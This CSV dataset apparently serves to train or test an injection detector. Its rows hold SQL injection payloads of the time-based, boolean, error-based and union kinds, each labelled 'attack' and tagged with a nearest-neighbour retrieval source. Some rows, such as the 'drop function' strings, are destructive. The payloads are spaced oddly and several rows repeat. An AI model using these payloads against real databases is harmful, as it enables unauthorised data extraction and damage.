id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001214,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R003152,17.488955610381996
CTGAN_001215,attack,boolean,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003511,3.998762696986025
CTGAN_001216,attack,error,"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",nearest_attack_euclidean,R001564,4.2740615569969655
CTGAN_001217,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,nearest_attack_euclidean,R005777,3.3796448036628033
CTGAN_001218,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,2.5127941297260334
CTGAN_001219,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",nearest_attack_euclidean,R004765,2.833878479707383
CTGAN_001220,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""tqbi""  =  ""tqbi",nearest_attack_euclidean,R006092,4.455952800732923
CTGAN_001221,attack,boolean,"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,nearest_attack_euclidean,R002228,2.5133250479772133
CTGAN_001222,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,2.012120279867837
CTGAN_001223,attack,other,"iif  (  4460  =  1610,1,1/0  )  ",nearest_attack_euclidean,R006045,2.459916899879497
CTGAN_001224,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R002238,2.437584213244289
CTGAN_001225,attack,other,1  ) ,nearest_attack_euclidean,R002968,2.409789450407821
CTGAN_001226,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R007275,3.939599257871671
CTGAN_001227,attack,union,"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",nearest_attack_euclidean,R008006,3.0466140961816226
CTGAN_001228,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008459,4.894771128352641
CTGAN_001229,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004549,3.2944394646153263
CTGAN_001230,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",nearest_attack_euclidean,R006609,4.608468215296215
CTGAN_001231,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R003066,2.4861006930463
CTGAN_001232,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R005396,1.6090968434591746
CTGAN_001233,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.280735738452887
CTGAN_001234,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,38.06042931060896
CTGAN_001235,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R006705,4.626288098242822
CTGAN_001236,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R003373,3.6267630782293017
CTGAN_001237,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R003135,5.1541879921713525
CTGAN_001238,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R002208,5.273186078597711
CTGAN_001239,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R001143,1.6950992494242405
CTGAN_001240,attack,time,1  )   where 9078  =  9078 rlike sleep  (  5  )  #,nearest_attack_euclidean,R006011,2.357626672975646
CTGAN_001241,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,nearest_attack_euclidean,R005838,4.2167047211023565
CTGAN_001242,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.331153459904886
CTGAN_001243,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R005100,3.6713336315542318
CTGAN_001244,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,3.8919443629699195
CTGAN_001245,attack,union,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",nearest_attack_euclidean,R008319,4.74593871859732
CTGAN_001246,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R003373,3.1462252452533486
CTGAN_001247,attack,other,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,nearest_attack_euclidean,R004222,2.833923020351028
CTGAN_001248,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R004993,3.9959241858902397
CTGAN_001249,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.5437514081960013
CTGAN_001250,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R008046,3.1986599237769613
CTGAN_001251,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R006380,1.5440125636968713
CTGAN_001252,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",nearest_attack_euclidean,R008059,3.3427579070236786
CTGAN_001253,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,2.216282263253475
CTGAN_001254,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R008453,4.00322557864276
CTGAN_001255,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000187,3.5869739870884776
CTGAN_001256,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R001569,3.6835690040325493
CTGAN_001257,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000182,4.539048334845066
CTGAN_001258,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.74928907559338
CTGAN_001259,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,3.663260310098746
CTGAN_001260,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R005850,4.164217354638246
CTGAN_001261,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.40774629992309
CTGAN_001262,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",nearest_attack_euclidean,R002421,4.4048174122932044
CTGAN_001263,attack,other,select case when 6558  =  4327 then 1 else null end--,nearest_attack_euclidean,R000710,5.061118882204179
CTGAN_001264,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R008729,4.567433881798616
CTGAN_001265,attack,union,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",nearest_attack_euclidean,R002595,2.784072966741069
CTGAN_001266,attack,boolean,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",nearest_attack_euclidean,R004187,3.8808636609808485
CTGAN_001267,attack,other,"elt  (  2427  =  2427,5518  )  ",nearest_attack_euclidean,R006197,2.9069185863307685
CTGAN_001268,attack,other,1  )   as sglv where 7676  =  7676,nearest_attack_euclidean,R004431,0.7944906401661402
CTGAN_001269,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R003864,1.7140124770378597
CTGAN_001270,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,2.667320466632748
CTGAN_001271,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,2.982060963494665
CTGAN_001272,attack,other, (  8362  =  9139  )  *9139,nearest_attack_euclidean,R005586,2.6865772119744924
CTGAN_001273,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R007238,4.481764322834819
CTGAN_001274,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",nearest_attack_euclidean,R007664,3.4328249830087336
CTGAN_001275,attack,boolean,"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",nearest_attack_euclidean,R006058,3.238963592509478
CTGAN_001276,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R005207,4.683990476830062
CTGAN_001277,attack,error,-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R006067,3.6413468739593284
CTGAN_001278,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R005531,3.2370606230245995
CTGAN_001279,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,6.047816922827826
CTGAN_001280,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,2.904325723580548
CTGAN_001281,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R002441,5.375768701294152
CTGAN_001282,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,5.14856717057311
CTGAN_001283,attack,boolean,"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",nearest_attack_euclidean,R007605,4.063121999612598
CTGAN_001284,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R002333,4.57165798240537
CTGAN_001285,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R006692,3.6318078272447605
CTGAN_001286,attack,time,"1%""   )    )    rlike sleep  (  5  )  #",nearest_attack_euclidean,R001591,2.8963158628112198
CTGAN_001287,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,4.456081493260903
CTGAN_001288,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000672,9.581261233260175
CTGAN_001289,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.0988319359289833
CTGAN_001290,attack,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm",nearest_attack_euclidean,R004931,3.129930262030679
CTGAN_001291,attack,other,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,nearest_attack_euclidean,R004222,3.8864578465233386
CTGAN_001292,attack,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",nearest_attack_euclidean,R002573,3.5574762307662384
CTGAN_001293,attack,boolean,"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""ypoj""  =  ""ypoj",nearest_attack_euclidean,R004052,4.478109244078068
CTGAN_001294,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,4.35388166523154
CTGAN_001295,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",nearest_attack_euclidean,R004747,3.3078856374506755
CTGAN_001296,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R002893,5.050263920885085
CTGAN_001297,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R003948,3.7909903767207336
CTGAN_001298,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R007646,2.516996974310602
CTGAN_001299,attack,other,"1""  )   as lvbm where 8179  =  8179",nearest_attack_euclidean,R002903,4.521127693931691
CTGAN_001300,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.493215300983458
